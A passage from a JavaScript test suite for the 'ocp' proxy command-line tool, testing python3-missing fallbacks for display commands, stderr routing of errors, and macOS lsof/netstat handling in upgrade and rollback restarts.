      extraUsage: { status: "allowed" },
    },
    proxy: { uptime: "5h", totalRequests: 42, activeRequests: 0, errors: 0, timeouts: 0 },
    models: {},
  });
  const r = _bwHarnessRun({ args: ["usage"], curlResponses: [{ match: "/usage", body }] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("Plan Usage Limits"), `expected the formatted header, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("Proxy: up 5h"), `expected the formatted proxy line, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_logs: absent python3 shows the raw log-entries JSON instead of dying silently", () => {
  const body = JSON.stringify({ entries: [{ raw: "2026-08-01 00:00:00 ERROR test-log-entry-marker" }], level: "error" });
  const r = _bwHarnessRun({ args: ["logs"], pythonAbsent: true, curlResponses: [{ match: "/logs?n=20&level=error", body }] });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("test-log-entry-marker"), `expected the raw entries JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_logs with python3 PRESENT still prints the formatted log line", () => {
  const body = JSON.stringify({ entries: [{ raw: "2026-08-01 00:00:00 ERROR test-log-entry-marker" }], level: "error" });
  const r = _bwHarnessRun({ args: ["logs"], curlResponses: [{ match: "/logs?n=20&level=error", body }] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("test-log-entry-marker"), `expected the formatted log line, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_models: absent python3 shows the raw models JSON instead of dying silently", () => {
  const body = JSON.stringify({ data: [{ id: "claude-sonnet-5-marker" }] });
  const r = _bwHarnessRun({ args: ["models"], pythonAbsent: true, curlResponses: [{ match: "/v1/models", body }] });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("claude-sonnet-5-marker"), `expected the raw models JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_models with python3 PRESENT still prints the formatted list", () => {
  const body = JSON.stringify({ data: [{ id: "claude-sonnet-5-marker" }] });
  const r = _bwHarnessRun({ args: ["models"], curlResponses: [{ match: "/v1/models", body }] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.equal(r.stdout.trim(), "claude-sonnet-5-marker", `expected the formatted model id line, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_sessions: absent python3 shows the raw sessions JSON instead of dying silently", () => {
  const body = JSON.stringify({ sessions: [{ id: "abcdefabcdefabcdef0123456789", model: "claude-sonnet-5", messages: 3, lastUsed: "2026-08-01T00:00:00Z" }] });
  const r = _bwHarnessRun({ args: ["sessions"], pythonAbsent: true, curlResponses: [{ match: "/sessions", body }] });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("abcdefabcdefabcdef0123456789"), `expected the raw sessions JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_sessions with python3 PRESENT still prints the formatted session row", () => {
  const body = JSON.stringify({ sessions: [{ id: "abcdefabcdefabcdef0123456789", model: "claude-sonnet-5", messages: 3, lastUsed: "2026-08-01T00:00:00Z" }] });
  const r = _bwHarnessRun({ args: ["sessions"], curlResponses: [{ match: "/sessions", body }] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("model=claude-sonnet-5"), `expected the formatted session row, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_clear: absent python3 still reports the clear happened (the DELETE already ran) with the raw count JSON, not a silent death", () => {
  const r = _bwHarnessRun({ args: ["clear"], pythonAbsent: true, curlResponses: [{ match: "/sessions", body: JSON.stringify({ cleared: 7 }) }] });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("Sessions were cleared, but the count could not be formatted"), `expected the clear-specific fallback message (not a generic one), got stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes('"cleared": 7') || r.stdout.includes('"cleared":7') || r.stdout.includes("cleared"), `expected the raw {"cleared":7} JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_clear with python3 PRESENT still prints 'Cleared N sessions.'", () => {
  const r = _bwHarnessRun({ args: ["clear"], curlResponses: [{ match: "/sessions", body: JSON.stringify({ cleared: 7 }) }] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("Cleared 7 sessions."), `expected the formatted count line, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_clear: python3 PRESENT but the response is malformed JSON — the fallback fires for a REAL crash, not just a missing binary", () => {
  // Real (unstubbed) /usr/bin/python3 on this harness's scratch $PATH — json.loads() genuinely
  // raises json.decoder.JSONDecodeError on this body, a different failure mode than
  // pythonAbsent:true's exit-127 stub. Proves _pyfail's `||` guard is keyed on the PIPELINE's
  // exit status, not merely "is python3 on PATH".
  const r = _bwHarnessRun({ args: ["clear"], curlResponses: [{ match: "/sessions", body: "not-json-at-all" }] });
  assert.notEqual(r.status, 0, `a malformed response must not be silently reported as success; status=${r.status}`);
  assert.ok(r.stderr.includes("Sessions were cleared, but the count could not be formatted"), `expected the clear-specific fallback message, got stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("not-json-at-all"), `expected the raw (malformed) response echoed back, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_keys add: absent python3 shows the raw JSON — the ONLY place the new key is ever shown must not be lost", () => {
  const r = _bwHarnessRun({
    args: ["keys", "add", "laptop-marker"], pythonAbsent: true, adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys", body: JSON.stringify({ name: "laptop-marker", key: "sk-marker-abc123" }) }],
  });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("sk-marker-abc123"), `THE KEY ITSELF must still be visible in the raw fallback output — losing it here means it can never be retrieved again; got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_keys add with python3 PRESENT still prints the formatted key panel", () => {
  const r = _bwHarnessRun({
    args: ["keys", "add", "laptop-marker"], adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys", body: JSON.stringify({ name: "laptop-marker", key: "sk-marker-abc123" }) }],
  });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("Key created for"), `expected the formatted success header, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("sk-marker-abc123"), `expected the formatted key line, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_keys add: python3 PRESENT but the response is malformed JSON — the key-loss-prevention fallback fires for a REAL crash too", () => {
  const r = _bwHarnessRun({
    args: ["keys", "add", "laptop-marker"], adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys", body: "not-json-at-all" }],
  });
  assert.notEqual(r.status, 0, `a malformed response must not be silently reported as success; status=${r.status}`);
  assert.ok(r.stderr.includes("Could not format the new key response"), `expected the key-specific fallback message, got stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("not-json-at-all"), `expected the raw (malformed) response echoed back rather than losing it, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 cmd_keys revoke: absent python3 shows the raw revoke JSON instead of dying silently", () => {
  const r = _bwHarnessRun({
    args: ["keys", "revoke", "laptop-marker"], pythonAbsent: true, adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys/laptop-marker", body: JSON.stringify({ revoked: true, idOrName: "laptop-marker" }) }],
  });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("laptop-marker"), `expected the raw revoke JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_keys revoke with python3 PRESENT still prints the formatted confirmation", () => {
  const r = _bwHarnessRun({
    args: ["keys", "revoke", "laptop-marker"], adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys/laptop-marker", body: JSON.stringify({ revoked: true, idOrName: "laptop-marker" }) }],
  });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("revoked"), `expected the formatted revoke confirmation, got: ${JSON.stringify(r.stdout)}`);
});

// ── The "10th site" (independent review, PR #252 round 1): `ocp keys` (list/"") already carried
// SOME fallback before this PR, but it was one umbrella `2>/dev/null || { generic message; exit
// 1; }` covering a curl failure and a python3 failure with the SAME misleading text regardless of
// which actually happened — the identical misdiagnosis class the other nine sites were fixed for.
test("#242 (10th site) cmd_keys list: absent python3 shows the raw keys JSON instead of the generic 'proxy unreachable' misdiagnosis", () => {
  const r = _bwHarnessRun({
    args: ["keys"], pythonAbsent: true, adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys", body: JSON.stringify({ keys: [{ name: "laptop-marker", keyPreview: "sk-ab..12", revoked: false, created_at: "2026-08-01" }] }) }],
  });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning (not the old generic 'proxy unreachable' text), got: ${JSON.stringify(r.stderr)}`);
  assert.ok(!r.stderr.includes("proxy unreachable or key management not available"), `must NOT misattribute a python3 failure to the proxy; stderr=${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("laptop-marker"), `expected the raw keys JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 (10th site) control: cmd_keys list with python3 PRESENT still prints the formatted table", () => {
  const r = _bwHarnessRun({
    args: ["keys"], adminKey: "test-admin-key-marker",
    curlResponses: [{ match: "/api/keys", body: JSON.stringify({ keys: [{ name: "laptop-marker", keyPreview: "sk-ab..12", revoked: false, created_at: "2026-08-01" }] }) }],
  });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("API Keys") && r.stdout.includes("laptop-marker"), `expected the formatted keys table, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 (10th site) control: cmd_keys list with a genuinely unreachable proxy still reports THAT (not a python3 message)", () => {
  // No curlResponses registered for "/api/keys" -> the harness's default curl stub refuses any
  // unhandled invocation (exit 94) -- close enough to "unreachable" for this assertion's purpose
  // (proving the curl-failure branch's own message is unaffected by this site's restructuring).
  const r = _bwHarnessRun({ args: ["keys"], adminKey: "test-admin-key-marker" });
  assert.notEqual(r.status, 0, `expected a non-zero exit; status=${r.status}`);
  assert.ok(r.stderr.includes("proxy unreachable or key management not available"), `expected the curl-failure message preserved, got stderr=${JSON.stringify(r.stderr)}`);
});

test("#242 cmd_settings (GET): absent python3 shows the raw settings JSON instead of dying silently", () => {
  const body = JSON.stringify({
    timeout: { value: 60000, unit: "ms", desc: "x" }, firstByteTimeout: { value: 15000, unit: "ms", desc: "x" },
    maxConcurrent: { value: 4, unit: "", desc: "x" }, sessionTTL: { value: 600000, unit: "ms", desc: "x" },
    maxPromptChars: { value: 100000, unit: "", desc: "x" },
    tiers: { opus: { base: 30000, perPromptChar: 0.001 }, sonnet: { base: 20000, perPromptChar: 0.0005 }, haiku: { base: 15000, perPromptChar: 0.0002 } },
  });
  const r = _bwHarnessRun({ args: ["settings"], pythonAbsent: true, curlResponses: [{ match: "/settings", body }] });
  assert.ok(!(r.status === 127 && r.stdout === ""), `must not reproduce #236's silent-127 signature; status=${r.status} stdout=${JSON.stringify(r.stdout)}`);
  assert.ok(r.stderr.includes("python3 is unavailable or failed to format the response"), `expected the _pyfail warning, got: ${JSON.stringify(r.stderr)}`);
  assert.ok(r.stdout.includes("maxPromptChars"), `expected the raw settings JSON on stdout, got: ${JSON.stringify(r.stdout)}`);
});

test("#242 control: cmd_settings (GET) with python3 PRESENT still prints the formatted panel", () => {
  const body = JSON.stringify({
    timeout: { value: 60000, unit: "ms", desc: "x" }, firstByteTimeout: { value: 15000, unit: "ms", desc: "x" },
    maxConcurrent: { value: 4, unit: "", desc: "x" }, sessionTTL: { value: 600000, unit: "ms", desc: "x" },
    maxPromptChars: { value: 100000, unit: "", desc: "x" },
    tiers: { opus: { base: 30000, perPromptChar: 0.001 }, sonnet: { base: 20000, perPromptChar: 0.0005 }, haiku: { base: 15000, perPromptChar: 0.0002 } },
  });
  const r = _bwHarnessRun({ args: ["settings"], curlResponses: [{ match: "/settings", body }] });
  assert.equal(r.status, 0, `expected a clean exit, got status=${r.status} stderr=${r.stderr}`);
  assert.ok(r.stdout.includes("OCP Settings"), `expected the formatted header, got: ${JSON.stringify(r.stdout)}`);
  assert.ok(r.stdout.includes("Timeout Tiers"), `expected the formatted tiers section, got: ${JSON.stringify(r.stdout)}`);
});

// ── Independent review, PR #252 round 1, fix 3: the "Error: proxy unreachable" guards THIS PR
// introduced (logs/models/sessions/settings/clear/keys-revoke) used to write to stdout, unlike
// `cmd_usage`'s own PRE-EXISTING guards (left untouched, per the review — see the money/control
// tests above, none of which touch that wording). `ocp models` piped into a consumer would read
// a stdout error line as data. No `curlResponses` entry is registered for the relevant URL below,
// so the harness's default curl stub refuses (exit 94) -- functionally equivalent to "unreachable"
// for the purpose of exercising this guard.
console.log("\nocp display commands: 'proxy unreachable' guards write to stderr, not stdout (#242 review fix 3):");

test("#242 fix-3 cmd_logs: 'Error: proxy unreachable' goes to stderr, stdout stays empty", () => {
  const r = _bwHarnessRun({ args: ["logs"] });
  assert.notEqual(r.status, 0);
  assert.ok(r.stderr.includes("Error: proxy unreachable"), `expected the message on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.equal(r.stdout, "", `stdout must stay clean of the error text (a consumer piping this output would read it as data); got: ${JSON.stringify(r.stdout)}`);
});

test("#242 fix-3 cmd_models: 'Error: proxy unreachable' goes to stderr, stdout stays empty", () => {
  const r = _bwHarnessRun({ args: ["models"] });
  assert.notEqual(r.status, 0);
  assert.ok(r.stderr.includes("Error: proxy unreachable"), `expected the message on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.equal(r.stdout, "", `stdout must stay clean; got: ${JSON.stringify(r.stdout)}`);
});

test("#242 fix-3 cmd_sessions: 'Error: proxy unreachable' goes to stderr, stdout stays empty", () => {
  const r = _bwHarnessRun({ args: ["sessions"] });
  assert.notEqual(r.status, 0);
  assert.ok(r.stderr.includes("Error: proxy unreachable"), `expected the message on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.equal(r.stdout, "", `stdout must stay clean; got: ${JSON.stringify(r.stdout)}`);
});

test("#242 fix-3 cmd_settings (GET): 'Error: proxy unreachable' goes to stderr, stdout stays empty", () => {
  const r = _bwHarnessRun({ args: ["settings"] });
  assert.notEqual(r.status, 0);
  assert.ok(r.stderr.includes("Error: proxy unreachable"), `expected the message on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.equal(r.stdout, "", `stdout must stay clean; got: ${JSON.stringify(r.stdout)}`);
});

test("#242 fix-3 cmd_clear: 'Error: proxy unreachable' goes to stderr, stdout stays empty", () => {
  const r = _bwHarnessRun({ args: ["clear"] });
  assert.notEqual(r.status, 0);
  assert.ok(r.stderr.includes("Error: proxy unreachable"), `expected the message on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.equal(r.stdout, "", `stdout must stay clean; got: ${JSON.stringify(r.stdout)}`);
});

test("#242 fix-3 cmd_keys revoke: 'Error: proxy unreachable or unauthorized' goes to stderr, stdout stays empty", () => {
  const r = _bwHarnessRun({ args: ["keys", "revoke", "laptop-marker"], adminKey: "test-admin-key-marker" });
  assert.notEqual(r.status, 0);
  assert.ok(r.stderr.includes("Error: proxy unreachable or unauthorized"), `expected the message on stderr, got: ${JSON.stringify(r.stderr)}`);
  assert.equal(r.stdout, "", `stdout must stay clean; got: ${JSON.stringify(r.stdout)}`);
});

console.log("\nRestart-unit resolution (issue #233 defect 1) — macOS lsof exit-code handling:");

// Background: `lsof -nP -iTCP:<port> -sTCP:LISTEN` EXITS 1 with EMPTY stdout when nothing
// matches (verified live: `/usr/sbin/lsof -nP -iTCP:59999 -sTCP:LISTEN; echo $?` -> exit 1, no
// output). `execSync` throws on any nonzero exit, and the pre-fix `scripts/upgrade.mjs` had one
// `catch { lsofOutput = null }` for every lsof failure — so that clean "not listening" result
// and a genuinely missing/failing tool both became `null` -> `resolveOwningUnit`'s "unknown" ->
// `planRestart`'s unconditional refusal, with the wrong diagnosis text ("lsof did not run") on
// top. `opts.allowNotListeningFallback` (the rollback recovery path PR #221 added) was therefore
// unreachable on macOS: a rollback against a down service hit "unknown" every time and stayed
// stuck on re-run. These tests drive the REAL gather pipeline (`opts.run`, not `mockOwnerProbe`)
// so the fix is exercised exactly where the bug lived — the impure catch in
// `scripts/upgrade.mjs`, not `classifyLsofListener` (which already handled "" vs null correctly).
//
// A netstat fixture showing NO LISTEN row for the mocked port (below) is required in every test
// here that expects the genuine not-listening outcome: HIGH-1 (an independent review of the PR
// that shipped defect 1) found that (status===1, empty stdout) is ALSO exactly what a non-root
// `lsof` produces against a ROOT-OWNED listener, so the fix now cross-checks with `netstat`
// (which shows LISTEN rows regardless of owning uid) before accepting "nothing is listening".
//
// FOLD-IN 1 (independent re-review of PR #240, post-HIGH-1): `netstatHasListenerOnPort`'s own
// parsing discipline — matching the port as an EXACT trailing `.<port>` segment, and requiring
// the row's state to actually be `LISTEN` — had no fixture able to catch a regression in either
// check, because the original fixtures never contained a row that could tell "parsed correctly"
// apart from "parsed sloppily": no adjacent-port row shared any digits with the target port (so
// a substring-match regression would coincidentally agree with the real suffix-match logic), and
// no row on the target port was in a non-LISTEN state (so dropping the state filter changed
// nothing observable). `NETSTAT_NO_LISTENER` below adds both:
//   - `*.13456` / `*.34567` — different ports that each contain "3456" as a SUBSTRING but do NOT
//     end in ".3456". `endsWith(".3456")` (the shipped code) correctly excludes both; `.includes
//     ("3456")` (mutation) would incorrectly match either — verified directly against both
//     candidates before use.
//   - a `TIME_WAIT` row on the mocked port itself (127.0.0.1.3456) — its address suffix DOES
//     match, but its state does not. The shipped `\bLISTEN\b` filter correctly excludes it;
//     dropping that filter (mutation) would incorrectly count it as a live listener. A `TIME_WAIT`
//     row here is also the realistic shape of the actual danger dropping the filter creates: a
//     socket the just-restarted process left behind, which must NOT be read as "still listening"
//     (that misreading is exactly what would leave a `--rollback` stuck refusing forever).
// `NETSTAT_HAS_LISTENER_3456` adds an `::1.3456` (IPv6 loopback) row alongside the IPv4 one, so a
// real dual-stack netstat listing is what these tests actually exercise, not a single-family
// simplification.
const NETSTAT_NO_LISTENER = "Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)\ntcp4       0      0  *.22                   *.*                    LISTEN\ntcp46      0      0  *.5900                 *.*                    LISTEN\ntcp4       0      0  *.13456                *.*                    LISTEN\ntcp6       0      0  *.34567                *.*                    LISTEN\ntcp4       0      0  127.0.0.1.3456         127.0.0.1.54321        TIME_WAIT";
const NETSTAT_HAS_LISTENER_3456 = "Active Internet connections (including servers)\nProto Recv-Q Send-Q  Local Address          Foreign Address        (state)\ntcp4       0      0  *.3456                 *.*                    LISTEN\ntcp6       0      0  ::1.3456               *.*                    LISTEN";

test("issue #233 defect 1: macOS lsof exit-1/empty-stdout ('nothing matched') maps to not-listening and refuses with the CORRECT message on `ocp update` (not the false 'lsof did not run') — netstat CONFIRMS no listener (HIGH-1)", async () => {
  const lsofNotListeningErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofNotListeningErr, "/usr/sbin/netstat": NETSTAT_NO_LISTENER });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "3456", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "upgrade must refuse when nothing is listening");
  assert.ok(/nothing is currently listening/.test(caught.message), `expected the not-listening refusal; got: ${caught.message}`);
  assert.ok(!/lsof did not run/.test(caught.message), `must not fall back to the false "lsof did not run" diagnosis; got: ${caught.message}`);
});

test("issue #233 defect 1: macOS rollback recovers via the not-listening fallback — previously unreachable (collapsed into 'unknown' forever) — netstat CONFIRMS no listener (HIGH-1)", async () => {
  const lsofNotListeningErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofNotListeningErr, "/usr/sbin/netstat": NETSTAT_NO_LISTENER });
  const result = await runUpgrade({
    rollback: true, yes: true, mockExec: true,
    mockPlatform: "darwin", mockPort: "3456", run,
    mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
    mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
  });
  const restartCmds = result.phases.filter(p => p.name === "restart").map(p => p.cmd);
  assert.equal(restartCmds.length, 2);
  assert.ok(restartCmds[0].includes("launchctl bootout"));
  assert.ok(restartCmds[1].includes("launchctl bootstrap"));
  assert.ok(result.phases.some(p => p.name === "restart-resolve" && p.note && p.note.includes("nothing was listening")),
    "the fallback must surface loudly in phases, not silently");
});

console.log("\nRestart-unit resolution (issue #233 HIGH-1, independent review of PR #240) — netstat cross-check for the privilege-gap ambiguity:");

// HIGH-1: a non-root `lsof` probing a ROOT-OWNED listener produces the byte-identical
// (status===1, empty stdout, empty stderr) signature as a genuine no-match — verified live,
// three independent instruments, against two real root-owned ports on this host. A root-owned
// OCP deployment is a supported shape (scripts/doctor.mjs's multi-unit-risk check has a
// dedicated branch for /Library/LaunchDaemons, scope:"system"), so this is not hypothetical:
// pre-defect-1 this mapped to null -> refuse (safe); post-defect-1 (pre-this-fix) it mapped to
// "" -> not-listening -> (on --rollback) allowNotListeningFallback -> bootout the user launchd
// agent while the root daemon still held the port -> EADDRINUSE -> (KeepAlive=true) a respawn
// loop. The failure direction inverted. These are the required acceptance tests for that gap.

test("HIGH-1 acceptance: lsof's ambiguous exit-1/empty-stdout shape, WITH netstat confirming a LISTEN row, refuses on `ocp update` — NOT the not-listening fallback", async () => {
  const lsofAmbiguousErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofAmbiguousErr, "/usr/sbin/netstat": NETSTAT_HAS_LISTENER_3456 });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "3456", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "a confirmed-but-unidentified listener must refuse, not proceed");
  assert.ok(!/nothing is currently listening/.test(caught.message), `must NOT be mistaken for not-listening; got: ${caught.message}`);
  assert.ok(/could not determine what.*owns the OCP port/s.test(caught.message), `expected the "could not determine" refusal; got: ${caught.message}`);
  // NOTE: do not also assert on "elevated privileges" here — that phrase is boilerplate present
  // in EVERY "unknown" refusal (planRestart's fixed closing sentence), not specific to this
  // reason, so it would pass vacuously even if the reason regressed to the generic "lsof did not
  // run" text. "could not identify ... owner" / "confirmed via netstat" appear ONLY in the
  // netstatConfirmsListener reason (scripts/lib/restart-unit.mjs's classifyLsofListener) — that
  // is the actual discriminator.
  assert.ok(/could not identify its owner|confirmed via netstat/i.test(caught.message), `reason should say a listener exists (confirmed via netstat) but could not be identified; got: ${caught.message}`);
});

test("HIGH-1 acceptance (the headline regression): lsof's ambiguous shape, WITH netstat confirming a LISTEN row, REFUSES on --rollback too — this is exactly the bootout-against-a-live-listener case", async () => {
  // Before this fix: this input mapped to "" (not-listening) -> allowNotListeningFallback ->
  // PROCEEDED with launchctl bootout+bootstrap against the user agent, while a root-owned
  // daemon (a supported OCP deployment shape) still held the port. This is the regression the
  // independent review of PR #240 found and the reason HIGH-1 blocks that PR.
  const lsofAmbiguousErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofAmbiguousErr, "/usr/sbin/netstat": NETSTAT_HAS_LISTENER_3456 });
  let caught = null;
  try {
    await runUpgrade({
      rollback: true, yes: true, mockExec: true,
      mockPlatform: "darwin", mockPort: "3456", run,
      mockSnapshots: [{ name: "upgrade-snapshot-2026-05-11T08:30:00Z", path: "/tmp/snap-x" }],
      mockSnapshotMeta: { fromCommit: "abc1234", fromVersion: "v3.10.0", toVersion: "v3.14.0", path: "/tmp/snap-x" },
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "rollback must refuse rather than bootout against an unidentified live listener");
  assert.ok(!caught.phases?.some(p => p.name === "restart" && /launchctl bootout/.test(p.cmd || "")),
    "no bootout/bootstrap command may appear in phases — the fallback must not have fired");
  // Not "elevated privileges" — that's boilerplate on every "unknown" refusal (see the sibling
  // upgrade-path test's note); "could not identify its owner" is unique to this reason.
  assert.ok(/could not identify its owner|confirmed via netstat/i.test(caught.message), `expected the privilege-gap message; got: ${caught.message}`);
});

test("HIGH-1: netstat itself failing to run maps to unknown and refuses (fail closed) — distinct from lsof missing entirely", async () => {
  const lsofAmbiguousErr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "" });
  const netstatFailure = new Error("netstat: command not found");
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofAmbiguousErr, "/usr/sbin/netstat": netstatFailure });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "3456", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "a failed netstat cross-check must fail closed, never silently proceed");
  assert.ok(!/nothing is currently listening/.test(caught.message), `must not be mistaken for not-listening; got: ${caught.message}`);
  assert.ok(/could not determine what.*owns the OCP port/s.test(caught.message), `expected the "could not determine" refusal; got: ${caught.message}`);
  assert.ok(/netstat.*failed to run|cross-check.*failed/i.test(caught.message), `reason should mention the netstat cross-check failing; got: ${caught.message}`);
});

test("HIGH-1 mutation guard: a non-empty lsof stderr must NOT bypass the netstat cross-check (stderr is empty in BOTH the privilege-gap and genuine-no-match cases, so it cannot discriminate them)", async () => {
  // Acceptance test for the reviewer's own mutation (d): adding `&& stderr.trim()===""` to the
  // ambiguous-shape guard left the pre-existing suite green (nothing pinned the stderr
  // dimension). This test fails under that mutation: a benign non-empty stderr must still let
  // the netstat cross-check run and confirm the listener, not short-circuit to a different
  // (wrong) outcome just because stderr happened to be non-empty.
  const lsofErrWithStderr = Object.assign(new Error("Command failed: /usr/sbin/lsof -nP -iTCP:3456 -sTCP:LISTEN"), { status: 1, stdout: "", stderr: "lsof: WARNING: something benign\n" });
  const run = makeFakeRun({ "/usr/sbin/lsof -nP": lsofErrWithStderr, "/usr/sbin/netstat": NETSTAT_HAS_LISTENER_3456 });
  let caught = null;
  try {
    await runUpgrade({
      yes: true, dryRun: false, mockExec: true,
      mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" },
      mockPlatform: "darwin", mockPort: "3456", run,
    });
  } catch (e) { caught = e; }
  assert.ok(caught, "must still refuse");
  // Not "elevated privileges" — boilerplate on every "unknown" refusal, so it would pass even if
  // this regressed to the generic "lsof did not run" reason (which is exactly what mutation (d)
  // — gating the ambiguous-shape guard on stderr emptiness too — produces for this input, since
  // its stderr is deliberately non-empty above). "could not identify its owner" / "confirmed via
  // netstat" appear only when netstat was actually consulted.
  assert.ok(/could not identify its owner|confirmed via netstat/i.test(caught.message),
    `netstat must still have been consulted (privilege-gap message expected) despite non-empty stderr; got: ${caught.message}`);
});

